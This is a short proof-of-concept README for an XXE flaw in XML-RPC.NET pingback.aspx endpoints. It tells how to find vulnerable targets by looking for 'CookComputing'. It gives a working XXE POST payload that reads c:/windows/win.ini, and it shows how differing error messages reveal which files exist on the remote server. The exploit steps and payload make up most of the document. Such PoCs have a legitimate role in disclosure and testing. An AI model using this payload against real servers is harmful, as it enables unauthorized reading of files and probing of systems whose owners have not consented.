# xmlrpc.net-poc
Proof of Concept (PoC) for XML-RPC.NET XXE

1. Identify a vulnerable pingback.aspx endpoint. "CookComputing" tends to be a strong signal.

![xml-rpc-1](https://user-images.githubusercontent.com/3679232/207168120-9465cd3d-2f3d-4ae0-b308-090de2b2501f.png)

2. Leverage the following XXE POST payload:

```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
"file://c:/windows/win.ini">]><foo>&xxe;</foo> 
```

3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")

![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207168416-9c801f2f-27ca-47c4-a5df-a4f66af98a58.png)

4. Request an existent file on the remote server (e.g. "win.ini"). Note the error message is different when requesting access to an existing file. This validates our XXE is working as intended.

![xml-rpc-3](https://user-images.githubusercontent.com/3679232/207167024-7338126f-6736-4f14-9a64-b6a0ecc7417e.png)
